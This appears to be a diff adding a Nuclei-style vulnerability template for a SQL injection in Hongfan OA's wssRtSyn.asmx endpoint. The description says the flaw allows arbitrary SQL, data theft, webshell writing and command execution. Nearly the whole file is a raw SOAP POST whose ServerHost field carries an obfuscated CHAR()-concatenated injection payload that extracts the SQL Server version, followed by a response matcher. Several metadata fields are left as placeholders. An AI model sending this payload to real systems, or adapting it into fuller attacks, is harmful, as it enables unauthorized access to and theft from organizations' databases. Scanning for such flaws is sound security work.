@@ -1,0 +1,35 @@
+id: hongfan-wssRtSyn-sqli
+info:
+  name: Template Name
+  author: apple
+  severity: high
+  description: 红帆OA wssRtSyn.asmx sql注入，黑客可以利用该漏洞执行任意SQL语句，如查询数据、下载数据、写入webshell、执行系统命令以及绕过登录限制等。
+  reference:
+    - https://
+  tags: tags
+http:
+  - raw:
+      - |
+        POST /iOffice/prg/set/wss/wssRtSyn.asmx HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36
+        Content-Type: text/xml
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+        Accept-Encoding: gzip,deflate
+        Connection: Keep-alive
+
+        <?xml version="1.0"?>
+        <soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tns="http://iOffice.net/iOffice/ioRtSyn">
+        <soap:Header />
+        <soap:Body>
+        <tns:SubmitLogInfo>
+        <tns:data>qwe</tns:data>
+        <tns:ServerHost>1'+(SELECT CHAR(103)+CHAR(105)+CHAR(75)+CHAR(83) WHERE 6621=6621 AND 7795 IN (SELECT (CHAR(113)+CHAR(118)+CHAR(106)+CHAR(122)+CHAR(113)+(SELECT @@version)+CHAR(113)+CHAR(118)+CHAR(113)+CHAR(120)+CHAR(113))))+'</tns:ServerHost>
+        </tns:SubmitLogInfo>
+        </soap:Body>
+        </soap:Envelope>
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'SQL Server'
